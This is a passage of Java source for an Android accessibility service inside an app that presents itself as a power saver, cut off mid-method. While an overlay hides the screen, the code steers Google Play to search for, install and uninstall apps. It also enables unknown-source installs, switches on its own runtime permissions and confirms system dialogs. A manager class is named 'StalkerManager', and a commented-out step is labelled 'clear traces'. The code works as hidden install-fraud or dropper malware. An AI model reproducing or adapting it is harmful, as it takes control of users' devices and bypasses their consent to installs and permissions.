package com.luna.powersaver.gp.service;

import android.accessibilityservice.AccessibilityService;
import android.annotation.TargetApi;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.support.annotation.RequiresApi;
import android.text.TextUtils;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.luna.powersaver.gp.PowerSaver;
import com.luna.powersaver.gp.R;
import com.luna.powersaver.gp.common.GPResId;
import com.luna.powersaver.gp.common.StaticConst;
import com.luna.powersaver.gp.manager.StalkerManager;
import com.luna.powersaver.gp.utils.AppDebugLog;
import com.luna.powersaver.gp.utils.AppUtil;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

/**
 * @author JackieZhuang
 * @email zsigui@foxmail.com
 * @date 2016/12/26
 */
@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
public class NBAccessibilityService extends AccessibilityService implements PowerSaver.StateChangeCallback {


    // 该状态表明当前是否正处于完成任务状态
    public static boolean sIsInWork = false;
    public static int sRetryTime = 0;
    // 作为每次执行操作类型的步骤状态，重设TYPE需要初始化为0
    public static int sCurrentWorkState = 0;
    // 值查看 TYPE
    public static int sCurrentWorkType = TYPE.IGNORED;

    public interface TYPE {
        int IGNORED = 0;
        int DOWNLOAD_BY_GP = 1;
        int DOWNLOAD_BY_GP_SEARCH = 2;
        int INSTALL_MANUALLY = 3;
        int OPEN_MANUALLY = 4;
        int UNINSTALL_MANUALLY = 5;
        int UNINSTALL_BY_GP = 6;
        int SET_PERMISSION = 7;
        int CLEAR = 100;
    }

    // 接收到的最后一次窗口状态变化的事件
    private AccessibilityEvent finalWindowStateChangeEvent;
    private Handler mHandler = new Handler();
    private boolean mIsTimeOut = false;
    Runnable mTimeOutRunnable = new Runnable() {
        @Override
        public void run() {
            if (mIsTimeOut) {
                performGlobalBack();
                StalkerManager.get().doNextStartAfterError(0, "打开GP超时!");
            }
        }
    };

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        if (StaticConst.sContext == null) {
            StaticConst.sContext = getApplicationContext();
        }
        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "NBAccessibilityService.onServiceConnected!");
        PowerSaver.get().addCallback(this);
//        DownloadManager.getInstance(StaticConst.sContext).addDownloadListener(StalkerManager.get());
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        PowerSaver.get().removeCallback(this);
//        DownloadManager.getInstance(StaticConst.sContext).removeDownloadListener(StalkerManager.get());
    }


    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || event.getPackageName() == null)
            return;
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.CHINA);
        AppDebugLog.w(AppDebugLog.TAG_ACCESSIBILITY, "onAccessibilityEvent is called! type = " + event.getEventType()
                + ", action = " + event.getAction() + ", time = " + df.format(new Date(event.getEventTime()))
                + ", text = " + event.getText() + ", package = " + event.getPackageName()
                + ", source.text = " + (event.getSource() != null ? event.getSource().getText() : "null")
                + ", isWork = " + sIsInWork + ", sCurrentType = " + sCurrentWorkType + ", sCurrentState = " +
                sCurrentWorkState);
//        traveselNodeInfo(getRootInActiveWindow(), 0);


        if (sIsInWork) {

            if (!PowerSaver.get().isGuardViewShown()) {
                sIsInWork = false;
                // 关闭屏幕
//                    handleClearWork(event);
                AppUtil.jumpToHome(StaticConst.sContext);
                return;
            }

            // 先进行18及以上处理，18以下暂不做适配
            if (Build.VERSION.SDK_INT > Build.VERSION_CODES.JELLY_BEAN_MR1) {

                if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                    finalWindowStateChangeEvent = event;
                }

                if (sCurrentWorkType == TYPE.SET_PERMISSION) {
                    handleSelfPermissionWork(event);
                    return;
                }

                if (StalkerManager.get().pCurrentWorkInfo != null
                        && TextUtils.isEmpty(StalkerManager.get().pCurrentWorkInfo.pkg)) {
                    return;
                }
                switch (sCurrentWorkType) {
                    case TYPE.DOWNLOAD_BY_GP:
                        if (!isHandleRetry(event)) {
                            handleDownloadWorkByGp(event);
                        }
                        break;
                    case TYPE.DOWNLOAD_BY_GP_SEARCH:
                        if (!isHandleRetry(event)) {
                            handleSearchWorkByGp(event);
                        }
                        break;
                    case TYPE.INSTALL_MANUALLY:
                        handleInstallWork(event);
                        break;
                    case TYPE.OPEN_MANUALLY:
                        handleOpenWork(event);
                        break;
                    case TYPE.UNINSTALL_MANUALLY:
                        handleUninstallWork(event);
                        break;
                    case TYPE.UNINSTALL_BY_GP:
                        if (!isHandleRetry(event)) {
                            handleUninstallByGpWork(event);
                        }
                        break;
                }
            }
        }
    }

    /**
     * 进行自我授权
     */
    private void handleSelfPermissionWork(AccessibilityEvent event) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M)
            return;
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "没有部分权限，判断是否处于详情界面");

            AccessibilityNodeInfo source = getRootInActiveWindow();
            List<AccessibilityNodeInfo> nodes;
            AccessibilityNodeInfo info;
            if (source == null) {
                return;
            }
            String pkg = event.getPackageName().toString();
            if (GPResId.SETTINGS_PKG.equals(pkg)) {
                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前处于设置界面，判断是否处于详情页");
                nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getDetailSettingHeaderId());
                if (nodes != null && nodes.size() > 0) {
                    // 当前处于详情页
                    info = travsalToFindFirstInfoContainsName(source, "TextView",
                            getResources().getString(R.string.powersaver_detail_setting_title_permission));
                    if (info == null)
                        return;
                    boolean result = info.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "点击进入权限列表页面，结果: " + result);
                    return;
                }
            }
            if (GPResId.INSTALLER_PKG.equals(pkg)
                    || GPResId.INSTALLER_GOOGLE_PKG.equals(pkg)) {
                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "判断当前是否处于权限列表界面");
                nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getDetailSettingPermissionSwitchId());
                if (nodes == null || nodes.size() < 1) {
                    return;
                }
                for (int i = 0; i < nodes.size(); i++) {
                    info = nodes.get(i);
                    if (info != null && !info.isChecked()) {
                        info.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    }
                }
                StalkerManager.get().saveCurrentTask();
                AppUtil.jumpToHome(StaticConst.sContext);
                StalkerManager.get().doNextStart();
            }
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    private void handleUninstallByGpWork(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                || event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {

            if (GPResId.PACKAGE.equals(event.getPackageName())) {

                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "现在正处于GP中，进行检测操作，sCurrentWorkState = " +
                        sCurrentWorkState);
                AccessibilityNodeInfo source = getRootInActiveWindow();
                if (source != null) {
                    List<AccessibilityNodeInfo> nodes;
                    AccessibilityNodeInfo info;
                    if (sCurrentWorkState == 0) {
                        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "判断是否处于应用详情页，然后进行下一步操作");
                        nodes = source.findAccessibilityNodeInfosByViewId(GPResId
                                .getTitleId());
                        if (nodes != null && nodes.size() > 0 && nodes.get(0) != null) {
                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前处于应用详情页界面，查询处理Title: " + nodes.get(0)
                                    .getText());
                            nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getUninstallBtnId());
                            if (nodes != null && nodes.size() > 0) {
                                info = nodes.get(0);
                                boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找到卸载按钮，点击卸载，执行结果: " + result);
                                if (result) {
                                    // 需要监测是否有继续栏了
                                    sCurrentWorkState = 3;
                                    finalWindowStateChangeEvent = event;
                                }
                            } else {
                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "查找不到卸载按钮，判断是否卸载");
                                if (!AppUtil.isPkgInstalled(this, StalkerManager.get().pCurrentWorkInfo.pkg)) {
                                    StalkerManager.get().doContinueAfterUninstall();
                                } else {
                                    AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "退出GP，采用普通卸载方式");
                                    sCurrentWorkState = 2;
                                    performGlobalBack();
                                    mHandler.postDelayed(new Runnable() {
                                        @Override
                                        public void run() {
                                            sCurrentWorkState = 0;
                                            sCurrentWorkType = TYPE.UNINSTALL_MANUALLY;
                                            AppUtil.uninstall(StaticConst.sContext,
                                                    StalkerManager.get().pCurrentWorkInfo.pkg);
                                        }
                                    }, 400);
                                }
                            }
                        }
                    } else if (sCurrentWorkState == 1) {
                        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前处于应用详情页界面，首先判断是否有卸载弹窗按钮");
                        nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getUninstallOkBtnId());

                        if (nodes != null && nodes.size() > 0) {
                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找到确认卸载，点击卸载");
                            info = nodes.get(0);
                            boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "确认卸载，卸载结果：" + result);
                            if (result) {
                                // 执行成功，退出GP
                                sCurrentWorkState = 2;
                                performGlobalBack();
                                StalkerManager.get().doContinueAfterUninstall();
                            }
                        } else {
                            sCurrentWorkState = 0;
                        }
                    }

                }
            }
        }
    }

//    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
//    private void handleClearWork(AccessibilityEvent event) {
//        String pkg = event.getPackageName().toString();
//        if (GPResId.INSTALLER_PKG.equals(pkg)
//                || GPResId.INSTALLER_GOOGLE_PKG.equals(pkg)
//                || GPResId.PACKAGE.equals(pkg)
//                || GPResId.NOTIFY_DOWNLOAD_PKG.equals(pkg)
//                || (StalkerManager.get().pCurrentWorkInfo != null
//                && pkg.equals(StalkerManager.get().pCurrentWorkInfo.pkg))) {
//            AppUtil.jumpToHome(StaticConst.sContext);
//        }
//        sIsInWork = false;
//    }


    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    private void handleInstallWork(AccessibilityEvent event) {
        String pkg = event.getPackageName().toString();
        // 需要处理未知权限的问题
        if (sCurrentWorkState > 1) {
            if (GPResId.SETTINGS_PKG.equals(pkg)) {
                AccessibilityNodeInfo source = getRootInActiveWindow();
                List<AccessibilityNodeInfo> nodes;
                AccessibilityNodeInfo info;
                if (source != null) {
                    if (sCurrentWorkState == 2) {
                        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "查找允许安装的源选项");
                        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "开始查找特定含未知源的TextView");
                            info = travsalToFindFirstInfoContainsName(source, "TextView",
                                    getResources().getString(R.string.powersaver_setting_item_title_unknown_source));
                            if (info == null) {
                                // 找不到，很可能因为已经在弹窗选项界面
                                sCurrentWorkState = 3;
                                handleInstallWork(event);
                                return;
                            }
                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找到含未知源选项的项，text = " + info.getText());
                            info = travsalToFindFirstInfoContainsName(info.getParent(), "Switch", null);
                            if (info == null) {
                                // 找不到，很可能因为已经在弹窗选项界面
                                sCurrentWorkState = 3;
                                handleInstallWork(event);
                                return;
                            }
                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "查找到切换器为: " + info.getClassName());
                            if (!info.isChecked()) {
                                boolean result = info.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                sCurrentWorkState = 3;
                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "点击设置为确定，结果: " + result);
                            } else {
                                sCurrentWorkState = 0;
                                performGlobalBack();
                                // 重新唤起安装
                                mHandler.postDelayed(new Runnable() {
                                    @Override
                                    public void run() {
                                        StalkerManager.get().doContinueAfterDownloaded(null);
                                    }
                                }, 400);
                            }
                        }
                    } else if (sCurrentWorkState == 3) {
                        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "检查是否有确定开启弹窗");
                        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                            nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getSystemDialogOkBtnId());
                            if (nodes == null || nodes.size() < 1) {
                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找不到确定弹窗按钮列表");
                                return;
                            }
                            info = nodes.get(0);
                            if (info == null) {
                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找不到确定弹窗按钮");
                                return;
                            }
                            boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "确定允许未知安装源，结果:" + result + ", info" +
                                    ".isClickable = " + info.isClickable());
                            if (result) {
                                sCurrentWorkState = 2;
                                performGlobalBack();
                                // 延迟 300 ms是为了避免冲突
                                mHandler.postDelayed(new Runnable() {
                                    @Override
                                    public void run() {
                                        StalkerManager.get().doContinueAfterDownloaded(null);
                                    }
                                }, 400);
                            } else {
                                sCurrentWorkState = 0;
                                performGlobalBack();
                                StalkerManager.get().doNextStartAfterError(0, "开启未知源安装失败");
                            }
                        }
                    }
                }
            }
            return;
        }
        if (GPResId.INSTALLER_PKG.equals(pkg)
                || GPResId.INSTALLER_GOOGLE_PKG.equals(pkg)) {
            AppDebugLog.w(AppDebugLog.TAG_ACCESSIBILITY, "当前检测到Installer的执行，处于安装行为中");
            AccessibilityNodeInfo source = getRootInActiveWindow();
            List<AccessibilityNodeInfo> nodes;
            AccessibilityNodeInfo info;
            if (source != null) {
                // 判断是否检测到系统弹窗提示，通常是用于判断
                if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                    AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "检测是否有禁止安装的弹窗");
                    nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getSystemDialogTitleId());
                    if (nodes != null && nodes.size() > 0) {
                        // 存在弹窗
                        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前检测到弹窗，判断是否禁止安装弹窗！");
                        info = nodes.get(0);
                        if (info == null) {
                            return;
                        }
                        if (info.getText() != null && getResources().getString(R.string
                                .powersaver_dialog_title_install_blocked)
                                .equals(info.getText().toString())) {
                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前是禁止安装弹窗，查找按钮跳转设置界面");
                            nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getSystemDialogOkBtnId());
                            if (nodes == null || nodes.size() < 1)
                                return;
                            info = nodes.get(0);
                            if (info == null)
                                return;
                            boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "跳转设置界面，点击结果：" + result);
                            sCurrentWorkState = 2;
                            return;
                        }
                    }
                }
                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "正常安装界面，执行查找安装按钮判断");
                if (sCurrentWorkState == 0) {
                    nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getInstallOkBtnId());
                    if (nodes != null && nodes.size() > 0) {
                        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                            return;
                        }
                        info = nodes.get(0);
                        if (info != null) {
                            boolean isClick = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            AppDebugLog.w(AppDebugLog.TAG_ACCESSIBILITY, "确定安装，执行结果： " + isClick);
                            if (!isClick) {
                                performGlobalBack();
                            }
                            sCurrentWorkState = 1;
                        }
                    }
                } else if (sCurrentWorkState == 1) {
                    nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getInstalledDoneBtnId());
                    if (nodes != null && nodes.size() > 0) {
                        info = nodes.get(0);
                        if (info != null) {
                            boolean isClick = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            AppDebugLog.w(AppDebugLog.TAG_ACCESSIBILITY, "确定完成安装，执行结果： " + isClick);
                            if (!isClick) {
                                performGlobalBack();
                            }
                            StalkerManager.get().doContinueAfterInstalled();
                        }
                    }
                }
            }
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    private void handleOpenWork(AccessibilityEvent event) {
        if (sCurrentWorkState == 0) {
            // 重复判断运行中
            if (event.getPackageName().equals(StalkerManager.get().pCurrentWorkInfo.pkg)) {
                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前应用打开中，如果弹出权限弹出，自动确定");
                AppDebugLog.w(AppDebugLog.TAG_ACCESSIBILITY, "当前应用打开中，判断是否执行任务是否完成");
                if (StalkerManager.get().isFinishedOpen()) {
                    performGlobalBack();
                    sCurrentWorkState = 1;
                }
            }
        } else if (sCurrentWorkState == 1) {
            // 当前处于退出请求中
            if (event.getPackageName().equals(StalkerManager.get().pCurrentWorkInfo.pkg)) {
                performGlobalBack();
            } else {
                sCurrentWorkState = 2;
                StalkerManager.get().doContinueAfterOpened();
            }
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    private void handleUninstallWork(AccessibilityEvent event) {
        String pkg = event.getPackageName().toString();
        if (GPResId.INSTALLER_PKG.equals(pkg)
                || GPResId.INSTALLER_GOOGLE_PKG.equals(pkg)) {
            AppDebugLog.w(AppDebugLog.TAG_ACCESSIBILITY, "当前检测到Installer的执行，处于卸载行为中");
            AccessibilityNodeInfo source = getRootInActiveWindow();
            List<AccessibilityNodeInfo> nodes;
            if (source != null) {
                nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getUninstallOkBtnId());
                AccessibilityNodeInfo info;
                if (nodes != null && nodes.size() > 0) {
                    info = nodes.get(0);
                    if (info != null) {
                        boolean isClick = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        AppDebugLog.w(AppDebugLog.TAG_ACCESSIBILITY, "确定卸载，执行结果： " + isClick);
                        if (isClick) {
                            StalkerManager.get().doContinueAfterUninstall();
                            return;
                        }
                    }
                } else {
                    AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "查找不到卸载确定按钮，取消卸载");
                }
            }
            StalkerManager.get().doNextStartAfterError(0, "卸载失败");
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    private boolean handleSearchWorkByGp(AccessibilityEvent event) {
        if (GPResId.PACKAGE.equals(event.getPackageName().toString())) {

            AccessibilityNodeInfo source = getRootInActiveWindow();
            List<AccessibilityNodeInfo> nodes;
            AccessibilityNodeInfo info;
            if (source != null) {
                if (sCurrentWorkState == 0) {
                    // 还没有获取输入搜索
                    nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getSearchIdleId());
                    AppDebugLog.w(AppDebugLog.TAG_ACCESSIBILITY, "查找搜索输入按钮，进行点击操作获取焦点: " + nodes);
                    if (nodes != null && nodes.size() > 0) {
                        info = nodes.get(0);
                        if (info != null) {
                            boolean isClick = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            AppDebugLog.w(AppDebugLog.TAG_ACCESSIBILITY, "对搜索进行点击获取焦点 " + isClick);
                            if (isClick) {
                                sCurrentWorkState = 1;
                            }
                        }
                    }

                } else if (sCurrentWorkState == 1) {
                    nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getSearchInputId());
                    AppDebugLog.w(AppDebugLog.TAG_ACCESSIBILITY, "查找搜索输入文本框");
                    if (nodes != null && nodes.size() > 0) {
                        info = nodes.get(0);
                        AppDebugLog.w(AppDebugLog.TAG_ACCESSIBILITY, "找到搜索输入文本框");
                        if (info != null && info.isEditable()) {
                            AppDebugLog.w(AppDebugLog.TAG_ACCESSIBILITY, "进行内容设置");
                            setText(info, StalkerManager.get().pCurrentWorkInfo.appname);
                            sCurrentWorkState = 2;
                        }
                    }
                } else if (sCurrentWorkState == 2) {
//                        traveselNodeInfo(getRootInActiveWindow(), 0);
                    nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getSearchSuggestionId());
                    AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "查找建议列表弹窗");
                    if (nodes != null && nodes.size() > 0) {
                        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "获取到建议列表弹窗，进行遍历查找符合项");
                        info = nodes.get(0);
                        nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getSearchSuggestItemTextId());
                        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "查找到建议列表项文本ID节点列表： " + nodes);
                        if (nodes != null && nodes.size() > 0) {
                            for (int i = 0; i < nodes.size(); i++) {
                                info = nodes.get(i);
                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "该项的值：" + (info != null ? info.getText()
                                        : "none"));
                                if (info != null && info.getText() != null
                                        && StalkerManager.get().pCurrentWorkInfo.appname.equals(info.getText()
                                        .toString())) {
                                    AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "查找到名称相同的指定项，获取其父节点进行点击!");
                                    if (info.getParent() != null) {
                                        boolean result = info.getParent().performAction(AccessibilityNodeInfo
                                                .ACTION_CLICK);
                                        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "点击了查找到的项: 结果: " + result);
                                        if (result) {
                                            StalkerManager.get().doContinueAfterSearch();
                                        }
                                    }
                                    return true;
                                }
                            }
                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找不到名称相同的指定项，选择第一个提示进入");
                            sCurrentWorkState = 3;
                            nodes.get(0).getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        }
                    }
                } else if (sCurrentWorkState == 3) {
                    AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "判断当前是否进入了详情页面");
                    nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getTitleId());
                    if (nodes != null && nodes.size() > 0) {
                        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前已经进入了详情页，执行下载或者卸载等其他操作!");
                        sCurrentWorkState = 4;
                    } else {
                        nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getSearchResultListItemTitleId());
                        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前尚未进入详情页，在搜索列表中，获取搜索项");
                        if (nodes != null && nodes.size() > 0) {
                            for (int i = 0; i < nodes.size(); i++) {
                                info = nodes.get(i);
                                if (info != null && info.getText() != null
                                        && StalkerManager.get().pCurrentWorkInfo.appname.equals(info.getText()
                                        .toString())) {
                                    AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "查找到名称相同的指定项，获取其父节点进行点击!");
                                    if (info.getParent() != null) {
                                        boolean result = info.getParent().performAction(AccessibilityNodeInfo
                                                .ACTION_CLICK);
                                        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "点击了查找到的项: 结果: " + result);
                                        if (result) {
                                            StalkerManager.get().doContinueAfterSearch();
                                        }
                                    }
                                    return true;
                                }
                            }
                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前选项找不到符合的，执行下滑继续查找");
                            performGlobalAction(GESTURE_SWIPE_UP);
                        }
                    }
                }
            }
        }
        return false;
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    private void setText(AccessibilityNodeInfo info, String msg) {
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.LOLLIPOP) {
            Bundle args = new Bundle();
            args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, msg);
            info.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
        } else {
            ClipData data = ClipData.newPlainText("data", msg);
            ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            cm.setPrimaryClip(data);
            info.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
            info.performAction(AccessibilityNodeInfo.ACTION_PASTE);
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    private void handleDownloadWorkByGp(AccessibilityEvent event) {

        // 由handleClearWork()进行处理
//        if (sCurrentWorkState == 2) {
//            // 清除痕迹，所以要判断是否商店并退出
//            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "清除痕迹，所以要判断是否商店并退出");
//            if (finalWindowStateChangeEvent != null && GPResId.PACKAGE.equals
//                    (finalWindowStateChangeEvent.getPackageName().toString())) {
//
//                // 处于GP，执行后退
//                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "工作页面尚处于GP中，执行退出");
//                performGlobalBack();
//            }
//            return;
//        }
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            finalWindowStateChangeEvent = event;
        }
        if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "状态栏发生变化了！！");
            if (sCurrentWorkState == 3) {
                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前是点击安装之后引起的状态栏变化，判断是否由于下载引起");
                // 通知栏发生变化了
                if (GPResId.NOTIFY_DOWNLOAD_PKG.equals(event.getPackageName().toString())) {
                    // 下载引起的变化，说明是下载中
                    AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "通知栏变化是由于下载通知引起的，则说明执行下载了，修改状态为监听下载");
                    sCurrentWorkState = 1;
                    // 判断当前上次变化是否处于GP中，是则执行退出
                    if (finalWindowStateChangeEvent != null && finalWindowStateChangeEvent.getPackageName() != null
                            && GPResId.PACKAGE.equals(finalWindowStateChangeEvent.getPackageName().toString())) {

                        // 处于GP，执行后退
                        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "工作页面尚处于GP中，执行退出");
                        performGlobalBack();
                    }
                }
            } else if (sCurrentWorkState == 1) {
                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "监测下载中，现在要监测任务是否完成："
                        + event.getPackageName());
                spyIsAppInstalled(event);
            }
        }
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                || event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            if (event.getPackageName() != null && GPResId.PACKAGE.equals(event.getPackageName())) {
                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "现在正处于GP中，进行检测操作，sCurrentWorkState = " +
                        sCurrentWorkState);
                AccessibilityNodeInfo source = getRootInActiveWindow();
                if (source != null) {
                    List<AccessibilityNodeInfo> nodes;
                    if (sCurrentWorkState == 0) {
                        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "判断是否处于应用详情页，然后进行下一步操作");
                        nodes = source.findAccessibilityNodeInfosByViewId(GPResId
                                .getTitleId());
                        if (nodes != null && nodes.size() > 0 && nodes.get(0) != null) {
                            mIsTimeOut = false;
                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前处于应用详情页界面，查询处理Title: " + nodes.get(0)
                                    .getText());
                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前处于应用详情页界面，首先判断是否有接收按钮");
                            nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getContinueBarId());
                            AccessibilityNodeInfo info;
                            if (nodes != null && nodes.size() > 0) {
                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找到继续按钮的界面，查找继续的确认按钮");
                                nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getContinueBtnId());
                                if (nodes != null && nodes.size() > 0) {
                                    info = nodes.get(0);
                                    boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                    AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找到继续安装按钮，执行安装程序! class = " + info
                                            .getClassName() + ", " +
                                            "isClickable = " + info.isClickable()
                                            + ", click result = " + result);
                                    if (result) {
                                        // 执行成功，退出GP
                                        sCurrentWorkState = 1;
                                        performGlobalBack();
                                    }
                                }
                            } else {
                                nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getInstallBtnResId());

                                if (nodes != null && nodes.size() > 0) {
                                    info = nodes.get(0);
                                    boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                    AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找到安装按钮，执行安装程序! class = " + info
                                            .getClassName() + ", " +
                                            "isClickable =" +

                                            " " + info.isClickable()

                                            + ", click result = " + result);
                                    if (result) {
                                        // 需要监测是否有继续栏了
                                        sCurrentWorkState = 3;
                                        finalWindowStateChangeEvent = event;
                                    }
                                } else {
                                    AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "查找不到安装按钮，判断是否已经安装");
                                    if (AppUtil.isPkgInstalled(this, StalkerManager.get().pCurrentWorkInfo.pkg)) {
                                        StalkerManager.get().doContinueAfterInstalled();
                                    } else {
                                        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "没有安装，没找到安装按钮，默认安装中，退出GP");
                                        performGlobalBack();
                                    }
                                }
                            }
                        } else {
                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前不处于应用详情页界面，判断是否加载中");
